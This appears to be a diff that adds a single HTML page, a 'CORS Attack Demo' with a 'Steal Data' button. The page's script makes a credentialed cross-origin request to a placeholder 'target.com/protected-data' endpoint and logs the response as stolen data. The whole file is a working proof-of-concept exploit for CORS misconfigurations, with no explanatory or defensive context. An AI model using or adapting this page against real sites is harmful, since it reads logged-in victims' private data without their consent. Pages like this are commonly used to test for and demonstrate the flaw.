@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Attack Demo</title>
+</head>
+<body>
+    <h1>Malicious CORS Attack Page</h1>
+    <button id="attackBtn">Steal Data</button>
+
+    <script>
+        document.getElementById('attackBtn').addEventListener('click', function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://target.com/protected-data', true); // Целевой уязвимый сайт
+            xhr.withCredentials = true;
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log('Data stolen:', xhr.responseText);
+                }
+            };
+            xhr.send();
+        });
+    </script>
+</body>
+</html>
